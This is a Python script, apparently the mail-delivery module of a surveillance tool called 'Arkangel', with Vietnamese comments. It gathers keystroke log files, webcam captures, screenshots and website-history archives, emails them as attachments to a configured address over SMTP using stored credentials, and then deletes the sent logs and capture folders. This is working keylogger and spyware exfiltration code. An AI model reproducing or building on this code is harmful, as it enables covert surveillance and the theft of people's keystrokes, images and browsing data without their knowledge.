import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
from getsqldata import *
from datetime import datetime

uid = getCurrentUser()
conf = getRowValue('Email',uid)
deli = getRowValue('EmailDelivery',uid)
print(conf)
print(deli)
def DelSentLogs(files):
    for f in files:
        if(os.path.exists(f)):
            os.remove(f)
            
def DelCurrLogs(pathDir):
    if(os.path.exists(pathDir)):
        for i in os.listdir(pathDir):
            os.remove(os.path.join(pathDir, i))
    
def TotalFileSize(arr_file):
    size = 0
    for f in arr_file:
        if(os.path.exists(f)):
            size = size + os.path.getsize(f)
    return size >> 10

size = conf[9]
enSize = conf[8]

fromaddr = deli[4] # uname
toaddr = deli[1] # sendto
  
# instance of MIMEMultipart
msg = MIMEMultipart()
 
# storing the senders email address  
msg['From'] = fromaddr
 
# storing the receivers email address 
msg['To'] = toaddr
 
# storing the subject 
msg['Subject'] = deli[6]
 
# string to store the body of the mail
body = 'Message from Arkangel!! \nTime: ' + datetime.now().strftime('%Y_%m_%d-%H_%M_%S')
 
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))

email = getRowValue('Users',uid)[1]
token = getRowValue('current_user',uid)[1]
#keystrokeLogs = datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt'

dir_path = getRowValue('Setting',uid) # thu muc chua file can gui

# cac file can gui
files = []
if (conf[4] == 1):
    for file in os.listdir(dir_path[1]):
        if file.endswith(email+'-'+token+".txt"):
            filePath = os.path.join(dir_path[1], file)
            print(filePath)
            files.append(filePath)
if (conf[5] == 1):
    files.append(os.path.join(dir_path[3],"Screenshot.zip"))
if (conf[6] == 1):
    files.append(os.path.join(dir_path[2],"Webcam.zip"))
if (conf[7] == 1):
    files.append(os.path.join(dir_path[5],"Website.zip"))

for f in files:  # add files to the message
    if (os.path.exists(f)):
        attachment = MIMEApplication(open(f, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition','attachment', filename=f)
        msg.attach(attachment)
        print("Attach " +str(f)+" sucessful!")
    else:
        print(str(f) + " does not exists!!!")
        
# creates SMTP session
smtp = deli[2]
port = deli[3]

s = smtplib.SMTP(smtp, 25)
#s = smtplib.SMTP(smtp, port)
s.connect(smtp,port)
s.ehlo()
# start TLS for security
s.starttls()
s.ehlo()

 
# Authentication
pwd = deli[5]
s.login(fromaddr, pwd)
 
# Converts the Multipart msg into a string
text = msg.as_string()

try:
    success = 0
    if(enSize == 1 and TotalFileSize(files) > size):
        # sending the mail
        s.sendmail(fromaddr, toaddr, text)
        print("Send mail successful!")
        success = 1
    elif(enSize == 0 and conf[1] == 1):
        s.sendmail(fromaddr, toaddr, text)
        success = 1
        print("Send mail successful!")
    
    if (success == 1):
        wc = getRowValue("Webcam",uid)
        if(conf[10] == 1):
            # delete sent log
            DelSentLogs(files)
            print("Del sent logs ok")
            # delete exists log in folder
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))   
            DelCurrLogs(os.path.join(dir_path[3],"Screenshot"))
            DelCurrLogs(os.path.join(dir_path[5],"Website"))
            print("Del log in folder ok")
        elif(wc[7] == 1):
            # if email not set delete after upload successful,
            # check in webcam to delete
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))
            print("Del webcam logs ok")

except Exception as e:
    print("Error : " + str(e))
 
# terminating the session
s.quit()
